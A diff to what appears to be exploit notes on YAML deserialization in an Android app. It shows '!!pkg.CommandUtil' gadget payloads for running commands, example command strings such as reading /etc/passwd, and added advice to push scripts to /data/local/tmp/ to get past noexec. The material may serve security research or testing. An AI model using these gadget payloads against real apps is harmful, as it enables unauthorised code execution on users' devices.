@@ -81,10 +81,13 @@ property2: value2
 - ❌ `"sh -c 'id > /tmp/out'"` — fails (quotes not interpreted)
 - ❌ `"cat /etc/passwd | grep root"` — fails (pipe not interpreted)
 
+**Pitfall: noexec on /data partition**
+On modern Android, `/data` is mounted with `noexec`. Scripts pushed to `/data/data/pkg/` or `/sdcard/` will fail with "Permission denied" even if `chmod 755`. Only binaries in `/system/bin/` (like `sh`, `touch`, `cp`, `ls`) can be executed directly.
+
 **Workarounds for shell features:**
-1. Push a script first, then execute it:
+1. Push a script to `/data/local/tmp/` (has exec permission on rooted devices):
    ```yaml
-   !!pkg.CommandUtil ["/data/data/pkg/script.sh"]
+   !!pkg.CommandUtil ["/data/local/tmp/script.sh"]
    ```
 2. Use `ProcessBuilder` gadget (takes String array):
    ```yaml
